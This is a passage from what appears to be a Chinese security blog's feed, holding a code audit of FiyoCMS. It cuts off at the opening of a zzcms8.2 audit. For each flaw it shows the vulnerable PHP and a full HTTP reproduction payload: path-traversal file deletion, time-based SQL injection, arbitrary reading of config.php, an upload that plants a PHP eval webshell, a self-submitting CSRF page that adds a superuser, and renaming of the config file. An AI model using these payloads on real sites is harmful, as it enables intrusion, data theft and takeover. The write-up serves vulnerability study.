class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>($c) &#123;</span><br><span class="line">$size = format_size(filesize(<span class="string">"../../../../.backup/$file.sql"</span>));</span><br><span class="line">$time = date(<span class="string">"Y/m/d H:i:s"</span>,filemtime(<span class="string">"../../../../.backup/$file.sql"</span>));</span><br><span class="line">$r = <span class="string">"$size - $time"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123; \"file\":\"$file.sql\" , \"info\":\"$r\" &#125;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个文件存在非常多这个问题，通过POST传递的参数file没有经过任何处理就拼接进<strong>unlink</strong>函数进行文件删除操作</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>在网站根目录下建立demo.php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>攻击payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/apps/app_config/controller/backuper.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 65</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Referer: http://127.0.0.1/dapur/index.php?app=config&amp;view=backup</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type=database&amp;file=../demo.php</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>demo.php被删除</p><h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><h4 id="位置-1"><a href="#位置-1" class="headerlink" title="位置"></a>位置</h4><p>/system/database.php 第210-233行</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table,$rows,$where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $update = <span class="string">'UPDATE '</span>.$table.<span class="string">' SET '</span>;</span><br><span class="line">    $keys = array_keys($rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($rows); $i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_string($rows[$keys[$i]]) <span class="keyword">AND</span> $rows[$keys[$i]] !== <span class="string">'+hits'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $update .= $keys[$i].<span class="string">'="'</span>.$rows[$keys[$i]].<span class="string">'"'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="keyword">if</span>($rows[$keys[$i]] == <span class="string">'+hits'</span>) $rows[$keys[$i]] = $keys[$i] . <span class="string">'+'</span>. <span class="number">1</span>;</span><br><span class="line">             $update .= $keys[$i].<span class="string">'='</span>.$rows[$keys[$i]];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Parse to add commas</span></span><br><span class="line">        <span class="keyword">if</span>($i != count($rows)<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $update .= <span class="string">','</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $update .= <span class="string">' WHERE '</span>.$where;</span><br></pre></td></tr></table></figure><p>可以看到这里update语句中的where条件是通过直接拼接参数$where而成的，猜测可能通过$where参数构成sql注入，我们随便找一个带有update方法的实例，如/dapur/apps/app_user/controller.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'stat'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'stat'</span>]==<span class="string">'1'</span>)&#123;</span><br><span class="line">$db-&gt;update(FDBPrefix.<span class="string">'user'</span>,<span class="keyword">array</span>(<span class="string">"status"</span>=&gt;<span class="string">"1"</span>),<span class="string">'id='</span>.$_GET[<span class="string">'id'</span>]);</span><br><span class="line">alert(<span class="string">'success'</span>,Status_Applied,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过GET方式构造id参数构成SQL注入攻击</p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /dapur/apps/app_user/controller/status.php?stat=1&amp;id=1%20and%20if(ascii(substr(database(),1,1))=102,sleep(3),1) HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功造成延时注入</p><p>当然，<strong>delete</strong>方法也同样存在这个问题，就不赘述了</p><h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><h4 id="位置-2"><a href="#位置-2" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_theme/libs/check_file.php 第13-26行</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$file = $url= <span class="string">"$_GET[src]/$_GET[name]"</span>; </span><br><span class="line">$furl = <span class="string">"../../../$url"</span>;</span><br><span class="line"></span><br><span class="line">$content = strlen(<span class="string">"$file"</span>) - <span class="number">5</span>;</span><br><span class="line">$content = substr(<span class="string">"$file"</span>,$content);</span><br><span class="line">$file = strpos(<span class="string">"$content"</span>,<span class="string">"."</span>);</span><br><span class="line">$file = substr(<span class="string">"$content"</span>,$file+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file == <span class="string">"html"</span> || $file == <span class="string">"htm"</span> || $file == <span class="string">"xhtml"</span> || $file == <span class="string">"js"</span> ||</span><br><span class="line">$file == <span class="string">"jsp"</span> || $file == <span class="string">"php"</span> || $file == <span class="string">"css"</span> || $file == <span class="string">"xml"</span> ) :</span><br><span class="line">$content = @file_get_contents($furl);</span><br><span class="line">$content = htmlentities($content);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计可知，当$file后缀名为指定文件后缀时，通过<strong>file_get_contents</strong>函数进行文件读取功能，而参数$furl是通过GET方式传入的参数src和name拼接而成的，这就构成了任意文件读取漏洞</p><h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /dapur/apps/app_theme/libs/check_file.php?src=..&amp;name=config.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>读取的是网站根目录下的config.php文件，结果如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="位置-3"><a href="#位置-3" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_theme/libs/save_file.php 第23-27行</p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$c = $_POST[<span class="string">"content"</span>];</span><br><span class="line">$f = $_POST[<span class="string">"src"</span>]; </span><br><span class="line">$w = file_put_contents($f,$c);</span><br></pre></td></tr></table></figure><p>显而易见没有过滤参数就拼接在<strong>file_put_contents</strong>函数中，构成文件上传漏洞</p><h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/apps/app_theme/libs/save_file.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">src=../../../../demo.php&amp;content=&lt;?php eval($_POST[&apos;cmd&apos;]); ?&gt;</span><br></pre></td></tr></table></figure><p>在网站根目录下上传一个文件名为demo.php的一句话木马文件，结果如下图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传一句话木马文件</p><h3 id="CSRF添加超级用户"><a href="#CSRF添加超级用户" class="headerlink" title="CSRF添加超级用户"></a>CSRF添加超级用户</h3><h4 id="位置-4"><a href="#位置-4" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_user/sys_user.php 第110-123行</p><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'save'</span>]) <span class="keyword">or</span> <span class="keyword">isset</span>($_POST[<span class="string">'apply'</span>]))&#123;</span><br><span class="line">$us=strlen(<span class="string">"$_POST[user]"</span>);</span><br><span class="line">$ps=strlen(<span class="string">"$_POST[password]"</span>);</span><br><span class="line">$user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">preg_match(<span class="string">'/[^a-zA-Z0-9]+/'</span>, $user, $matches);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]) <span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'user'</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>($_POST[<span class="string">'level'</span>])<span class="keyword">AND</span> </span><br><span class="line">$_POST[<span class="string">'password'</span>]==$_POST[<span class="string">'kpassword'</span>] <span class="keyword">AND</span> </span><br><span class="line">$us&gt;<span class="number">2</span> <span class="keyword">AND</span> $ps&gt;<span class="number">3</span> <span class="keyword">AND</span> @ereg(<span class="string">"^.+@.+\\..+$"</span>,$_POST[<span class="string">'email'</span>]) <span class="keyword">AND</span> !$matches) &#123;</span><br><span class="line">$qr=$db-&gt;insert(FDBPrefix.<span class="string">'user'</span>,<span class="keyword">array</span>(<span class="string">""</span>,<span class="string">"$user"</span>,<span class="string">"$name"</span>,MD5(<span class="string">"$_POST[password]"</span>),<span class="string">"$_POST[email]"</span>,<span class="string">"$_POST[status]"</span>,<span class="string">"$_POST[level]"</span>,date(<span class="string">'Y-m-d H:i:s'</span>),<span class="string">''</span>,<span class="string">"$_POST[bio]"</span>));</span><br></pre></td></tr></table></figure><p>这是一个添加用户的程序，但是没有加入token验证，所以可以造成CSRF攻击，添加超级用户</p><h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p>我们先抓取添加用户的包，确定需要提交的参数，抓包结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/?app=user&amp;act=add HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 124</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/dapur/?app=user&amp;act=add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">apply=Next&amp;id=&amp;z=&amp;user=test02&amp;z=&amp;x=&amp;password=test02&amp;kpassword=test02&amp;email=123%4012345.com&amp;level=1&amp;name=test02&amp;status=1&amp;bio=</span><br></pre></td></tr></table></figure><p>构造好的用于建立超级用户的网页代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"csrf"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/dapur/?app=user&amp;act=add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"apply"</span> <span class="attr">value</span>=<span class="string">"Next"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"z"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"z"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"x"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"kpassword"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"123&amp;#x40;12345&amp;#x2e;com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"level"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"test66"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"status"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"bio"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        document.csrf.submit();</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户访问<a href="https://127.0.0.1/demo.html，就会立即生成test66的超级用户" target="_blank" rel="noopener">https://127.0.0.1/demo.html，就会立即生成test66的超级用户</a></p><h3 id="任意文件修改漏洞"><a href="#任意文件修改漏洞" class="headerlink" title="任意文件修改漏洞"></a>任意文件修改漏洞</h3><h4 id="位置-5"><a href="#位置-5" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_config/sys_config.php 第190-193行</p><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$new_folder = $_POST[<span class="string">'folder_new'</span>];</span><br><span class="line">$old_folder = $_POST[<span class="string">'folder_old'</span>];</span><br><span class="line"><span class="keyword">if</span>($old_folder != $new_folder) &#123;</span><br><span class="line">$ok = @rename(<span class="string">"../$old_folder"</span>,<span class="string">"../$new_folder"</span>);</span><br></pre></td></tr></table></figure><p>对POST传递的参数folder_new和folder_old未进行过滤拼接至<strong>rename</strong>函数进行文件名修改操作</p><h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /dapur/?app=config HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 517</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/dapur/?app=config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">config_save=Simpan&amp;site_name=fiyocms&amp;title=Fast%2C+Save+%26+Elegant%21&amp;url=localhost&amp;mail=your%40site.net&amp;folder_new=config.txt&amp;folder_old=config.php&amp;status=1&amp;meta_keys=keyword+1%2C+keyword+two%2C+3rd+key&amp;meta_desc=&amp;sef=1&amp;https=0&amp;www=1&amp;follow_link=1&amp;title_type=1&amp;title_divider=+-+&amp;sef_ext=.html&amp;name=fiyocms&amp;member_registration=1&amp;member_activation=2&amp;member_group=5&amp;file_allowed=swf+flv+avi+mpg+mpeg+qt+mov+wmv+asf+rm+rar+zip+exe+msi+iso&amp;disk_space=500&amp;file_size=5120&amp;media_theme=oxygen&amp;lang=id&amp;timezone=Asia%2FJakarta</span><br></pre></td></tr></table></figure><p>将网站根目录config.php文件修改成config.txt文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>直接可以查看网站的配置信息</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>该CMS存在大多的问题都是由于未对用户提交的参数进行过滤处理，导致一系列的漏洞发生，本次审计漏洞难度较简单，网站结构相对于zzcms较为复杂，还需要多加实践增加审计的经验</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--zzcms8.2</title>
    <link href="https://Foxgrin.github.io//posts/58925/"/>
    <id>https://Foxgrin.github.io//posts/58925/</id>
    <published>2019-02-26T11:15:00.000Z</published>
    <updated>2019-03-01T07:07:40.288Z</updated>
    
    <content type="html"><![CDATA[<p>记录zzcms8.2审计过程以及漏洞分析<a id="more"></a></p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>本地搭建的环境是phpstudy，在设置中打开允许目录列表（不然可能会出现403无法访问的情况），然后访问<a href="http://localhost/install进行安装" target="_blank" rel="noopener">http://localhost/install进行安装</a></p><h2 id="审计工具"><a href="#审计工具" class="headerlink" title="审计工具"></a>审计工具</h2><p>采用的审计工具是<strong>Seay源代码审计系统</strong>，将cms文件夹丢进去就可以帮助你分析出可能存在的漏洞以及对应的文件名，便于我们快速锁定漏洞所在，不用一个个文件去审计。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>该审计工具还可以进行关键字的全局搜索功能，能帮助我们快速锁定关键函数等。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>先进入网站根目录网站index.php，发现包含了关键的文件<strong>/inc/conn.php</strong>，跟进文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/inc/conn.php</span></span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/config.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/wjt.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/function.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/zsclass.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span class="string">"/inc/stopsqlin.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(zzcmsroot.<span 